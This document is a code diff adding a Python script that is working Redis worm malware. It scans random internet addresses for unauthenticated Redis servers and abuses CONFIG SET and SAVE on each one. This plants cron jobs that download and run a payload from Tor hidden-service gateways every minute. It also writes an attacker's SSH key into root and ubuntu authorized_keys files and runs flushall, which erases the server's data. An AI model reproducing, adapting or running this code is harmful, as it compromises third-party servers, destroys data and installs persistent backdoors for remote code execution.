@@ -1,0 +1,190 @@
+#! /usr/bin/env python
+#coding: utf-8
+
+import threading
+import socket
+from re import findall
+import httplib
+import os
+from random import randrange
+import random
+import string
+
+IP_LIST = []
+debug=0
+
+class scanner(threading.Thread):
+    tlist = []
+    maxthreads = 100
+    evnt = threading.Event()
+    lck = threading.Lock()
+
+    def __init__(self,host):
+        threading.Thread.__init__(self)
+        self.host = host
+    def run(self):
+        RHOST='https://an7kmd2wp4xo7hpr'
+        TOR1='.tor2web.su/'
+        TOR3='.onion.sh/'
+        TOR2='.tor2web.io/'
+        CHKCURL='tbin=$(command -v passwd); bpath=$(dirname \\"${tbin}\\"); curl=\\"curl\\"; if [ $(curl --version 2>/dev/null|grep \\"curl \\"|wc -l) -eq 0 ]; then curl=\\"echo\\"; if [ \\"${bpath}\\" != \\"\\" ]; then for f in ${bpath}*; do strings $f 2>/dev/null|grep -q \\"CURLOPT_VERBOSE\\" && curl=\\"$f\\" && break; done; fi; fi; wget=\\"wget\\"; if [ $(wget --version 2>/dev/null|grep \\"wgetrc \\"|wc -l) -eq 0 ]; then wget=\\"echo\\"; if [ \\"${bpath}\\" != \\"\\" ]; then for f in ${bpath}*; do strings $f 2>/dev/null|grep -q \\"to <bug-wget@gnu.org>\\" && wget=\\"$f\\" && break; done; fi; fi; if [ $(cat /etc/hosts|grep -i \\".onion.\\"|wc -l) -ne 0 ]; then echo \\"127.0.0.1 localhost\\" > /etc/hosts >/dev/null 2>&1; fi; '
+        RPATH1='src/ldm'
+        TIMEOUT='40'
+        COPTS='-fsSLk --max-time '+TIMEOUT
+        WOPTS='--quiet --no-check-certificate --timeout='+TIMEOUT
+        C1='\\n\\n*/1 * * * * root ('+CHKCURL+' ${curl} '+COPTS+' '+RHOST+TOR1+RPATH1+' -o ~/.ntp||${curl} '+COPTS+' '+RHOST+TOR2+RPATH1+' -o ~/.ntp||${curl} '+COPTS+' '+RHOST+TOR3+RPATH1+' -o ~/.ntp||wget '+WOPTS+' '+RHOST+TOR1+RPATH1+' -O ~/.ntp||wget '+WOPTS+' '+RHOST+TOR2+RPATH1+' -O ~/.ntp||wget '+WOPTS+' '+RHOST+TOR3+RPATH1+' -O ~/.ntp) && chmod +x ~/.ntp && sh ~/.ntp\\n\\n'
+        C2='\\n\\n*/1 * * * * ('+CHKCURL+' ${curl} '+COPTS+' '+RHOST+TOR1+RPATH1+' -o ~/.ntp||${curl} '+COPTS+' '+RHOST+TOR2+RPATH1+' -o ~/.ntp||${curl} '+COPTS+' '+RHOST+TOR3+RPATH1+' -o ~/.ntp||wget '+WOPTS+' '+RHOST+TOR1+RPATH1+' -O ~/.ntp||wget '+WOPTS+' '+RHOST+TOR2+RPATH1+' -O ~/.ntp||wget '+WOPTS+' '+RHOST+TOR3+RPATH1+' -O ~/.ntp) && chmod +x ~/.ntp && sh ~/.ntp\\n\\n'
+        SKEY="\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1Sdr0tIIL8yPhKTLzVMnRKj1zzGqtR4tKpM2bfBEx+AHyvBL8jDZDJ6fuVwEB+aZ8bl/pA5qhFWRRWhONLnLN9RWFx/880msXITwOXjCT3Qa6VpAFPPMazJpbppIg+LTkbOEjdDHvdZ8RhEt7tTXc2DoTDcs73EeepZbJmDFP8TCY7hwgLi0XcG8YHkDFoKFUhvSHPkzAsQd9hyOWaI1taLX2VZHAk8rOaYqaRG3URWH3hZvk8Hcgggm2q/IQQa9VLlX4cSM4SifM/ZNbLYAJhH1x3ZgscliZVmjB55wZWRL5oOZztOKJT2oczUuhDHM1qoUJjnxopqtZ5DrA76WH user@localhost\\n#"
+        try:
+            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s2.settimeout(3)
+            x = s2.connect_ex((self.host, 6379))
+            if x == 0:
+                DFDIR=DFRDB='N/A'
+                stt1=stt2=stt3=stt4=stt5=-9
+                tmp=rd(s2, 'config get dir\r\n')
+                if "Authentication required" in str(tmp): stt1=-10
+                elif "-ERR unknown command" not in str(tmp):
+                    if 'dir' in str(tmp): DFDIR=(tmp.split('dir'))[1].splitlines()[2]
+                    tmp=rd(s2, 'config get dbfilename\r\n')
+                    if 'dbfilename' in str(tmp): DFRDB=(tmp.split('dbfilename'))[1].splitlines()[2]
+                    rs=rd(s2, 'config set dbfilename root\r\n')
+                    if "+OK" in str(rs):
+                        rs=rd(s2, 'config set rdbcompression no\r\n')
+                        if "+OK" in str(rs):
+                            write=rd(s2, 'flushall\r\n')
+                            if "write against a read only" in str(write):
+                                rd(s2, 'SLAVEOF NO ONE\r\n')
+                                write=rd(s2, 'flushall\r\n')
+                            if "write against a read only" not in str(write):
+                                K1=''.join(random.choice(string.lowercase) for x in range(random.randint(4, 10)))
+                                K2=''.join(random.choice(string.lowercase) for x in range(random.randint(4, 10)))
+                                K3=''.join(random.choice(string.lowercase) for x in range(random.randint(4, 10)))
+                                CF=''.join(random.choice(string.lowercase) for x in range(random.randint(6, 18)))
+                                rs=rd(s2, 'config set stop-writes-on-bgsave-error no\r\n')
+                                #rs=rd(s2, 'set '+K1+' "'+C1+'"\r\n')
+                                rs=rd(s2, 'set '+K2+' "'+C2+'"\r\n')
+                                apt=chkdir(s2, '/usr/share/bug/apt/')
+                                if apt == -4:
+                                    fml='N.'
+                                    stt1=chkdir(s2, '/var/spool/cron')
+                                else:
+                                    fml='Debian.'
+                                    stt1=chkdir(s2, '/var/spool/cron/crontabs')
+                                pine=chkdir(s2, '/etc/crontabs')
+                                rs=rd(s2, 'del '+K2+'\r\n')
+                                rs=rd(s2, 'set '+K1+' "'+C1+'"\r\n')
+                                rs=rd(s2, 'config set dbfilename .'+CF+'\r\n')
+                                stt2=chkdir(s2, '/etc/cron.d')
+                                rs=rd(s2, 'config set dbfilename crontab\r\n')
+                                stt22=chkdir(s2, '/etc')
+                                if stt2 < 2: stt2=stt22
+                                rs=rd(s2, 'del '+K1+'\r\n')
+                                rs=rd(s2, 'config set dbfilename authorized_keys\r\n')
+                                rs=rd(s2, 'set '+K3+' "'+SKEY+'"\r\n')
+                                stt3=chkdir(s2, '/root/.ssh')
+                                stt4=chkdir(s2, '/home/ubuntu/.ssh')
+                                #time.sleep(1)
+                                rs=rd(s2, 'del '+K3+'\r\n')
+                            rs=rd(s2, 'config set rdbcompression yes\r\n')
+                            rs=rd(s2, 'config set stop-writes-on-bgsave-error yes\r\n')
+                        if "cron" not in str(DFDIR) and ".ssh" not in str(DFDIR):
+                            rs=rd(s2, 'config set dir '+DFDIR+'\r\n')
+                            rs=rd(s2, 'config set dbfilename '+DFRDB+'\r\n')
+                        else:
+                            rs=rd(s2, 'config set dir /var/lib/redis\r\n')
+                            rs=rd(s2, 'config set dbfilename dump.rdb\r\n')
+            s2.close()
+        except Exception:
+            pass
+        
+        scanner.lck.acquire()
+        scanner.tlist.remove(self)
+        if len(scanner.tlist) < scanner.maxthreads:
+            scanner.evnt.set()
+            scanner.evnt.clear()
+        scanner.lck.release()
+
+    def newthread(host):
+        scanner.lck.acquire()
+        sc = scanner(host)
+        scanner.tlist.append(sc)
+        scanner.lck.release()
+        sc.start()
+
+    newthread = staticmethod(newthread)
+
+def get_ip_list():
+    try:
+        url = 'ifconfig.co/ip'
+        conn = httplib.HTTPConnection(url, port=80, timeout=10)
+        conn.request(method='GET', url='/', )
+        result = conn.getresponse()
+        ip1 = result.read()
+        ips1 = findall(r'\d+.\d+.', ip1)[0]
+        for u in range(0, 256):
+            ip_list1 = (ips1 + (str(u)))
+            for g in range(1, 256):
+                IP_LIST.append(ip_list1 + '.' + (str(g)))
+    except Exception:
+        ip2 = os.popen("/sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d \"addr:\"").readline().rstrip()
+        ips2 = findall(r'\d+.\d+.', ip2)[0]
+        for i in range(0, 255):
+            ip_list2 = (ips2 + (str(i)))
+            for g in range(1, 255):
+                IP_LIST.append(ip_list2 + '.' + (str(g)))
+        pass
+
+def get_ip_list2():
+    not_valid = [10,127,169,172,192]
+    for i in range(0, 100000):
+        first = randrange(1,227)
+        while first in not_valid:
+            first = randrange(1,227)
+        ip = ".".join([str(first),str(randrange(0,256)),
+        str(randrange(0,256)),str(randrange(0,256))])
+        IP_LIST.append(ip)
+
+def runPortscan():
+    for x in range(99999):
+        get_ip_list2()
+        for host in IP_LIST:
+            scanner.lck.acquire()
+            if len(scanner.tlist) >= scanner.maxthreads:
+                scanner.lck.release()
+                scanner.evnt.wait()
+            else:
+                scanner.lck.release()
+            scanner.newthread(host)
+        for t in scanner.tlist:
+            t.join()
+
+def rd(sock, packet):
+    try:
+        sock.send(packet)
+        reply = sock.recv(1024)
+        if not reply: pass
+        if '*' not in reply and '$' not in reply and '+' not in reply and ':' not in reply and debug >= 2: print(reply)
+        return reply
+    except:
+        pass
+
+def chkdir(sock, dir):
+    stt=0
+    rs=rd(sock, 'config set dir '+dir+'\r\n')
+    if "+OK" in str(rs):
+        stt=1
+        rs=rd(sock, 'save\r\n')
+        if "+OK" in str(rs):
+            stt=2
+    elif "o such file or " in str(rs): stt=-4
+    return stt
+
+if __name__ == "__main__":
+    try:
+        runPortscan()
+    except KeyboardInterrupt:
+        try:
+            exit(0)
+        except SystemExit:
+            os._exit(0)
